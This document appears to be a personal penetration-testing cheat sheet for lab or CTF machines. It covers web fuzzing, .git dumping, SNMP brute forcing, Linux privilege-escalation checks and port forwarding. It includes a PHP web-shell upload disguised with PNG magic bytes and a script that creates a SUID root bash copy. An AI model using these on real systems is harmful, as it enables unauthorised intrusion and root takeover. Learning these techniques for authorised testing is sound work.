Directory fuzzing
1.  ` /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt ` - standard fuzzing list
2. ` /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt ` - longer list if the first one fails to find anything


API fuzzing
1. ` feroxbuster -u http://example.com/api -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -m GET,POST `
2. ` feroxbuster -u http://example.com/api/v1 --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -m GET,POST `

VHOST enumeration
1. ` ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com/ -H "Host: FUZZ.example.com" -mc all -fw <> ` - need to run with `-mc all` or the filter might filter out some extra things not sure why

`.git` repositories
1. ` wget --mirror -I .git` - download `git` repo
2. ` git-dumper ` - better tool for dumping repo
3. ` git status ` - may show uncommitted changes
4. ` git restore . ` - restores all files
5. ` git restore . && git diff ` - shows uncommitted changes
6. ` git log ` - shows commit history
7. ` git show <commit ID> ` - shows individual commit changes

SQL Injection
1. Basic enumeration by adding a `'` to end of input and checking for any errors - errors mean that injection may be possible

`SNMP` enumeration
1. ` snmpwalk `, ` snmpbulkwalk ` - to read the MIB tree, `snmpbulkwalk` is faster
2. ` snmpbrute.py ` - for brute forcing `SNMP` community strings (don't use `onesixtyone` as that only checks for `SNMP v1`)
3. `SNMP` config files located at `/etc/snmp/snmp.conf` and `/etc/snmp/snmpd.conf`, may contain credentials

Linux filesystem / privilege escalation enumeration (most of these should be run automatically with `linpeas.sh`)
1. Check `sudo -l` - even if you do not have the user's password
2. `SUID` binaries - Check anything that is not a default Linux `SUID` binary
3. Check default config file paths for web servers, CMS, applications - focus on the apps or services that were enumerated previously, e.g. check `SNMP` config files if `SNMP` is running
4. Check `/home` directories of other users - sometimes there are files that can be read, and used to pivot
5. Remember to check all folders, especially if they are hidden (beginning with a `.`)
6. Check `cron` jobs
7. Check listening ports - `ss -ntplu` or `netstat -an`
8. Check processes with `pspy` - scripts may be running in the back as root that you cannot see as a user
9. Check `/backup` and `/opt` - may contain some interesting files
10. Check user's groups - groups like `adm` and `lxd` are interesting
11. Check `systemctl list-timers --all` - alternative to `cron`

Linux manual `SUID` file enumeration
1. ` find / -type f -perm -04000 -ls 2>/dev/null `

Linux manual service enumeration
1. ` for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"; do find /etc/systemd/ -name "$service.service"; done | while read service_file; do ls -l $(cat "$service_file" | grep Exec | cut -d= -f 2 | cut -d' ' -f 1); done | sort -u `

Windows manual privilege escalation
1. ` netstat -ano `, then ` tasklist /v | findstr PID ` to find what process is running on what port

`cron` enumeration
1. ` ls -lah /etc/cron* ` - List all `cron` jobs with permissions
2. ` cat /etc/crontab ` – View system-wide `cron` jobs.
3.  ` cat /etc/cron* ` – Check scheduled `cron` jobs across all `cron` directories.
4. ` sudo crontab -l ` – List `cron` jobs for the current user.
5.  ` grep "CRON" /var/log/syslog ` – Search system logs for `cron` job activity.
6.  ` cat /etc/cron.d ` – View jobs in the `/etc/cron.d` directory.
7. ` cat /var/spool/cron/crontabs/root ` – Check `cron` jobs scheduled by the root user.
8. Look for weird files in `/opt` or `/tmp` and check their timestamps.
9. Check suspicious files using `ls -la` to see their modification times.
10. Use `pspy`, a powerful tool to track process detect `cron` jobs in real time

`bash` misconfigurations
1. https://mywiki.wooledge.org/BashPitfalls
2. In `sudo` scripts, look for files being read that the user has write permissions - can use to abuse `symlinks` to read `root` files like SSH keys
3. Check for relative path usage in scripts - can overwrite with a file in the working directory/ exported PATH

Port forwarding
1. ` chisel server --port 5555 --reverse ` - basic `chisel` server command
2. ` chisel client <kali IP>:5555 R:3306:127.0.0.1:3306 ` - basic `chisel` client command
3. ` ssh user@host -L LPORT:localhost:RPORT ` to do a simple SSH tunnel for port forwarding (may be more stable than `chisel`)

File uploads
1. ` echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > simplephpshell.php.png ` - PHP shell with PNG magic numbers

Extra things
1. `exiftool` - for images, files that may be downloaded, can find some interesting information
2. `SSLscan` - for SSL sites, certs may contain some information (subdomains etc.)
3. `steghide` - steganography tool
4. `pspy` - process snooper that can read the output of scripts/ cronjobs
5. `strings` - can be used on binaries or images to find embedded stuff
6. `knockd` - if running on the machine (check `ps auxww`), port knocking may be enabled, so check the config file at `/etc/knockd.conf`
7. `ltrace` - see what scripts/ binaries are trying to do when they are run
8. ` export PATH=$(pwd):$PATH ` - prepends current working directory to PATH - gives executables in the working directory priority over others in PATH, can be used to exploit relative paths

Scripts for launching shells
1. ` echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/script\nchown root:root /tmp/script\nchmod 6777 /tmp/script' >> script ` - if run as `sudo`, you can then run ` /tmp/script -p ` to launch a root shell.